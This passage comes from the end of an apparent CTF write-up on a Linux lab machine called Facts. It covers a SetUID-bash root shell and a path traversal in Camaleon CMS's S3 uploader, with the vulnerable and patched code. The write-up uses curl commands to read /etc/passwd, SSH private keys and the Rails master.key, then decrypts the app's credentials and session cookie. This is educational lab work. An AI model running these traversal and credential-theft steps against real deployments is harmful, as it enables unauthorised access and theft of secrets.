trivia@facts:~$ mount | grep /tmp
tmpfs on /tmp type tmpfs (rw,nosuid,nodev,nr_inodes=1048576,inode64)
```

When I run it again, and now there’s a SetUID / SetGID `bash` that provides a shell as root (when run with `-p` to prevent dropping privs):

```
trivia@facts:~$ /var/tmp/0xdf -p
0xdf-5.2#
```

And I can get `root.txt`:

```
0xdf-5.2# cat root.txt
a9723932************************
```

## Beyond Root - Alternative Foothold

### CVE Details

NIST defines [CVE-2024-46987](https://nvd.nist.gov/vuln/detail/CVE-2024-46987) as:

> Camaleon CMS is a dynamic and advanced content management system based on Ruby on Rails. A path traversal vulnerability accessible via MediaController’s download\_private\_file method allows authenticated users to download any file on the web server Camaleon CMS is running on (depending on the file permissions). This issue may lead to Information Disclosure. This issue has been addressed in release version 2.8.2. Users are advised to upgrade. There are no known workarounds for this vulnerability.

This is patched in 2.8.2. The vulnerable code from version 2.8.0 is in the `download_private_file` function on [lines 27-34](https://github.com/owen2345/camaleon-cms/blob/feccb96e542319ed608acd3a16fa5d92f13ede67/app/controllers/camaleon_cms/admin/media_controller.rb#L27-L34) of `media_controller.rb`:

```ruby
# download private files
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  send_file file, disposition: 'inline'
end
```

`fetch_file` is defined in either `camaleon_cms_local_uploader.rb` ([lines 27-31](https://github.com/owen2345/camaleon-cms/blob/2.8.0/app/uploaders/camaleon_cms_local_uploader.rb#L27-L31)) or `camaleon_cms_aws_uploader.rb` ([lines 38-44](https://github.com/owen2345/camaleon-cms/blob/2.8.0/app/uploaders/camaleon_cms_aws_uploader.rb#L38-L44)). Which one is used depends on if the CMS is configured to use local or AWS storage.

The updated function from [version 2.8.2](https://github.com/owen2345/camaleon-cms/blob/2.8.2/app/controllers/camaleon_cms/admin/media_controller.rb#L27-L36) add a check:

```ruby
# download private files
def download_private_file
  cama_uploader.enable_private_mode!

  file = cama_uploader.fetch_file("private/#{params[:file]}")

  return render plain: helpers.sanitize(file[:error]) if file.is_a?(Hash) && file[:error].present?

  send_file file, disposition: 'inline'
end
```

This check intends to gracefully surface the error path introduced one layer down, in `fetch_file`. In 2.8.2, the local uploader [gained](https://github.com/owen2345/camaleon-cms/blob/master/app/uploaders/camaleon_cms_local_uploader.rb#L27-L33) a `valid_folder_path?` guard at the top of `fetch_file`:

```ruby
def fetch_file(file_name)
  return { error: 'Invalid file path' } unless valid_folder_path?(file_name)

  return file_name if file_exists?(file_name)

  { error: 'File not found' }
end
```

So when the controller now passes `"private/#{params[:file]}"` containing `../` segments, the uploader rejects it and returns `{ error: 'Invalid file path' }` instead of a file path.

However, no change was made to the AWS version. That’s the root of CVE-2026-1776, which became public after Facts’ release. Any deployment configured to use the S3 backend (like this box’s MinIO) doesn’t have a fix for the directory traversal. That’s [CVE-2026-1776](https://nvd.nist.gov/vuln/detail/CVE-2026-1776):

> Camaleon CMS versions 2.4.5.0 through 2.9.0, prior to commit f54a77e, contain a path traversal vulnerability in the AWS S3 uploader implementation that allows authenticated users to read arbitrary files from the web server’s filesystem. The issue occurs in the download\_private\_file functionality when the application is configured to use the CamaleonCmsAwsUploader backend. Unlike the local uploader implementation, the AWS uploader does not validate file paths with valid\_folder\_path?, allowing directory traversal sequences to be supplied via the file parameter. As a result, any authenticated user, including low-privileged registered users, can access sensitive files such as /etc/passwd. This issue represents a bypass of the incomplete fix for CVE-2024-46987 and affects deployments using the AWS S3 storage backend.

### File Read

#### POC

I’ll start by showing that I can read arbitrary files over the directory traversal vulnerability.

I created the user 0xdf for the admin panel. I’ll login using `curl`. First I need to get the CSRF token from `/admin/login`:

```
oxdf@hacky$ AUTH=$(curl -s -c cookie.jar http://facts.htb/admin/login | grep -oP 'authenticity_token" value="\K[^"]+')
oxdf@hacky$ echo $AUTH
vLLGEMLtslrmGNcW6-gAP8_YP8LDkDGri-jp4MEAPdtXcb3duGeb3IM45soauSNOtQ4IZpJN7PtpUjXOPCIKCw
oxdf@hacky$ cat cookie.jar 
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

#HttpOnly_facts.htb     FALSE   /       FALSE   0       _factsapp_session       A4tbUX6mQNs6dIiFX3eHsZP5MH2Sx8vcREMjMWQY3rLOeEDV3HSrhbiFAFsxFazssIMSJ25DsNg%2BKWHPR2fkftObTBi8Rtjlr38tN%2BXfoG1aNSkmnLYGzVL19HXPc9b3rDKhcVCQGm5FLga4nW5lHKhCSoYcLmECAut1Z%2BRHLsqBmOiywZsKwPT%2Bsi2ZXNE7JD5%2FeUGoUUxoH8FNMpKFf8n%2FdFsNbHx0pM7WhB%2Bf2QRc%2F3HzA7Lu52mI2uIe9rlV1LAAyfpUgKWHUuho3HMMTrZGwXNWRpkLCQIAJ5LbqpojSGtnUg7CehWKprsk4V%2F6UT1jnSs%3D--a9Kb%2B0BpxzsQjmiZ--p%2B6yNI7PxHTO%2BXPEHts4dg%3D%3D
```

Any request without a `_factsapp_session` cookie also gets one set in the reply. Now I’ll login:

```
oxdf@hacky$ curl -b cookie.jar -c cookie.jar http://facts.htb/admin/login -d "authenticity_token=$AUTH" -d "user[username]=0xdf" -d "user[password]=0xdf" -d "commit=Login"
```

Now that cookie jar allows me to access the admin page:

```
oxdf@hacky$ curl -s http://facts.htb/admin -b cookie.jar | grep "2.9.0"
                <b>Version </b>2.9.0
```

From there, I’ll do the directory traversal to reach `passwd`:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../etc/passwd -b cookie.jar
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```

I’ll note the users, trivia and william.

#### Find WebApp Filesystem Location

I need to figure out where on the filesystem the FactsApp lives. `nginx` config isn’t helpful:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../etc/nginx/sites-enabled/default -b cookie.jar
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        if ($host != facts.htb) {
                rewrite ^ http://facts.htb/;
        }

        root /var/www/html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

}
```

This shows the redirect to the hostname. I can guess at config file names, and find it at `facts.htb`:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../etc/nginx/sites-enabled/facts.htb -b cookie.jar
server {
    listen 80;
    server_name facts.htb;

    # Rails app
    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    location = /randomfacts/ {
        return 403;
    }

    # LocalStack S3 API (for dev thumbnails / file access)
    location /randomfacts/ {
        proxy_pass http://127.0.0.1:54321/randomfacts/;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        autoindex off;
    }

}
```

This shows a proxy to port 3000 on localhost, but doesn’t show the location of the application.

I am able to guess the location of the service file!

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../etc/systemd/system/factsapp.service -b cookie.jar
[Unit]
Description=FactsApp Rails Service
After=ministack.service
Requires=ministack.service

[Service]
Type=simple
User=trivia
WorkingDirectory=/opt/factsapp
Environment="GEM_HOME=/opt/.local/share/gem"
Environment="BUNDLE_PATH=/opt/.local/share/gem"
Environment="PATH=/opt/.local/share/gem/:/usr/local/bin:/usr/bin:/bin"
ExecStart=/opt/.local/share/gem/bin/rails server -e production -b 127.0.0.1 -p 3000
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

The app is in `/opt/factsapp`, and it’s running as the trivia user.

#### SSH Keys

`passwd` shows that trivia’s home directory is `/home/trivia`, and `factsapp.service` shows that the application runs as that user. I’ll check for SSH keys. `/home/trivia/.ssh/id_rsa` returns 404. I can grab the `authorized_keys` file:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/authorized_keys -b cookie.jar
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICWYeZZS4gDH8+z1yn1hjRCpUfzY3RiH21fXq9qQIHqV
```

It has a ED25519 key! I’ll check for that under the default name:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../home/trivia/.ssh/id_ed25519 -b cookie.jar
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHW8s04W
...[snip]...
b4DSiCkcGuXvh28gzyxAsBnofoescym+OlJiA=
-----END OPENSSH PRIVATE KEY-----
```

I’ll crack that just like I did above, and get a shell:

```
oxdf@hacky$ ssh -i ~/keys/facts-trivia trivia@facts.htb
Enter passphrase for key '/home/oxdf/keys/facts-trivia':
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
...[snip]...
trivia@facts:~$
```

#### Ruby Secrets

Knowing where the app is, I’ll get the `master_key`:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../opt/factsapp/config/master.key -b cookie.jar
b0650437b2208a9fab449fb92f67bc40
```

I’ll also grab `credentials.yml.enc`:

```
oxdf@hacky$ curl -s http://facts.htb/admin/media/download_private_file?file=../../../opt/factsapp/config/credentials.yml.enc -b cookie.jar
SdpgX1MrbZfzLeRyMaP1/OMkbGQpScKdTPyFV4UeS7UHBlE7CTyX6GqaMh2Z/9eMzNlLrsJfbIMehlk0twL1x4wQyO9MjoahoxfNU2fm9Jsan//ZfOX8w5xspnrmSSY+AGd/0E24dsvD3fgNi/JnwzVi6wwfO97L6ZfNKkTqQVPxLCgYFDtEJHjAswGhNWwhlO6DQsOd7p2M/DK8Vsp0y7IrlTNna+cWAp93qo8N/kvDa8/YP4nJZnX9ffSFYf3CPTaSGj1ZwGCpnTJsULEADbLcnKIsyUbVFqrOVJDQrAlgQN7pvcZTAn9NN0meeYCVooKgbR8d1YLzJwJ75htdrQhiX8wXfi2FdsBbTLrYr8VEFCmPC6bRufvjdfQTvvQjnxgzUxbjh4z/4f3tWXTxlWCc0ExYFEwCyLrsfe5sdsqyxyA4knImPkDz/7JHSioX81bSEjmoFowh6fDlrkofxG3g6B5FDfvRu4GSEiJNN07Ma+EJR9tyQzMj--yMP6E8YydRfUIvNQ--WLJbhDu9CWS8smr6vrTOfQ==
```

I can decrypt the `credentials.yml` file using the `master_key` in [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64\('A-Za-z0-9%2B/%3D',true,false\)AES_Decrypt\(%7B'option':'Hex','string':'b0650437b2208a9fab449fb92f67bc40'%7D,%7B'option':'Base64','string':'yMP6E8YydRfUIvNQ'%7D,'GCM','Raw','Raw',%7B'option':'Base64','string':'WLJbhDu9CWS8smr6vrTOfQ%3D%3D'%7D,%7B'option':'Hex','string':''%7D\)&input=U2RwZ1gxTXJiWmZ6TGVSeU1hUDEvT01rYkdRcFNjS2RUUHlGVjRVZVM3VUhCbEU3Q1R5WDZHcWFNaDJaLzllTXpObExyc0pmYklNZWhsazB0d0wxeDR3UXlPOU1qb2Fob3hmTlUyZm05SnNhbi8vWmZPWDh3NXhzcG5ybVNTWStBR2QvMEUyNGRzdkQzZmdOaS9Kbnd6Vmk2d3dmTzk3TDZaZk5La1RxUVZQeExDZ1lGRHRFSkhqQXN3R2hOV3dobE82RFFzT2Q3cDJNL0RLOFZzcDB5N0lybFRObmErY1dBcDkzcW84Ti9rdkRhOC9ZUDRuSlpuWDlmZlNGWWYzQ1BUYVNHajFad0dDcG5USnNVTEVBRGJMY25LSXN5VWJWRnFyT1ZKRFFyQWxnUU43cHZjWlRBbjlOTjBtZWVZQ1Zvb0tnYlI4ZDFZTHpKd0o3NWh0ZHJRaGlYOHdYZmkyRmRzQmJUTHJZcjhWRUZDbVBDNmJSdWZ2amRmUVR2dlFqbnhnelV4YmpoNHovNGYzdFdYVHhsV0NjMEV4WUZFd0N5THJzZmU1c2RzcXl4eUE0a25JbVBrRHovN0pIU2lvWDgxYlNFam1vRm93aDZmRGxya29meEczZzZCNUZEZnZSdTRHU0VpSk5OMDdNYStFSlI5dHlRek1q). I’ll manually break the encryption blob into three parts, splitting on `--`. The first is the input, which needs to be base64-decoded. The second is the IV, and the third is the GCM Tag. The “key” is the `master_key` in hex:

![image-20260529102706485](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260529102706485.webp)

The `secret_key_base` is used to derive keys for other decrypts. I’ll decrypt my cookie, which I can URL decode and break down to:

```
CT (segment 1)
Segment: zbL5ODI4fcl0lCUxWTVJX2NMQxnv9Je+LsKPjSmJmBKrQkys7wWWd32FRYRWrhvtbI5yriQLDB1MTQqRSXacyGfzFJZUjxxyQ1ffc0WIvqxS1+yy1YOTqVNyfTdbqj3GrBtyk2Ctxj0LtwRAG6BB1gVbtDM0UoD7oOoXyLtmLBYm1N155iJSvGaYFFBUoSrgxcH0N+5wg/8ZhX6yUGhpOaMTQwC9cDM7MeNKlf5ZFg9m+fMMgY9SqGr3Qf/sM1Ff/y+xwAugBdYpt9QCY8IfNB91jfU9H+KUDYYDgCCywVxsJixBOea4tafb8MJHt017HNsnJsQ=
────────────────────────────────────────
IV (segment 2)
Segment: qxZR53Msp3Z3y7sJ
────────────────────────────────────────
TAG (segment 3)
Segment: FRxnfc+4ddkTH354yv5Npg==
```

I’ll use the `secret_key_base` to derive the key:

![image-20260529224116812](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260529224116812.webp)

Ruby uses “authenticated encrypted cookie” as the salt. I’ll take the resulting key along with the IV and TAG to decrypt the CT from the cookie:

![image-20260529224448547](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260529224448547.webp)

With this, I could craft new cookie data and re-encrypt it.
